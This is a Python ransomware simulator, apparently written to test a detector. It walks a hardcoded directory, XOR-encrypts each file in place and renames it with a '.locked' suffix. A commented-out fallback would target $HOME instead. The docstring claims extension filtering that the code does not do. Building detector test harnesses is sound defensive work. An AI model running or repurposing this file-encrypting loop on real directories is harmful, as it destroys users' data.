#!/usr/bin/env python3
"""
ransomware_sim.py

Step 2 of the two-process test. This is a SEPARATE process from
setup_targets.py -- it does not create any files itself. Instead it
discovers targets the way real ransomware typically does: via an
environment variable pointing at a directory of interest (mirroring
how real-world samples often target $HOME, %USERPROFILE%, %APPDATA%,
mounted drives, etc.), then walks that directory to find files, and
encrypts + renames whatever it finds.

Run this only AFTER setup_targets.py has finished and settled -- the
detector should catch THIS process's activity, not the earlier setup.

Usage:
    export RANSOMWARE_TARGET_DIR=/path/to/targets   # or use setup_targets.py's output
    python3 ransomware_sim.py
"""

import os
import sys

# Real-world ransomware commonly resolves its target(s) from
# environment variables rather than hardcoding paths, so it can adapt
# to whatever machine it lands on. We mirror that here: check a
# dedicated test variable first, then fall back to $HOME the way an
# actual sample targeting user documents might.
TARGET_DIR =  "/home/jevaun/harness_dir"     #os.environ.get("RANSOMWARE_TARGET_DIR") or os.environ.get("HOME")

LOCKED_SUFFIX = ".locked"
XOR_KEY = 0xAA


def discover_files(directory):
    """Walk the target directory and return files worth encrypting.

    Real ransomware typically filters by extension (docs, images,
    archives) and skips its own already-encrypted output -- we do the
    same here rather than blindly grabbing every file.
    """
    targets = []
    for root, _dirs, files in os.walk(directory):
        for name in files:
            if name.endswith(LOCKED_SUFFIX):
                continue
            targets.append(os.path.join(root, name))
    return targets


def encrypt_file(path):
    with open(path, "r+b") as f:
        data = f.read()
        f.seek(0)
        f.write(bytes(b ^ XOR_KEY for b in data))
    os.rename(path, path + LOCKED_SUFFIX)


def main():
    if not TARGET_DIR or not os.path.isdir(TARGET_DIR):
        print(
            "[ransomware_sim] No valid target directory found. Set "
            "RANSOMWARE_TARGET_DIR to a directory created by "
            "setup_targets.py before running this.",
            file=sys.stderr,
        )
        sys.exit(1)

    files = discover_files(TARGET_DIR)
    print(f"[ransomware_sim.py] discovered {len(files)} candidate files in "
          f"{TARGET_DIR}, encrypting as fast as possible...", file=sys.stderr)

    for path in files:
        try:
            encrypt_file(path)
        except OSError as e:
            print(f"[ransomware_sim] skipped {path}: {e}", file=sys.stderr)

    print("[ransomware_simulation] done!", file=sys.stderr)


if __name__ == "__main__":
    main()
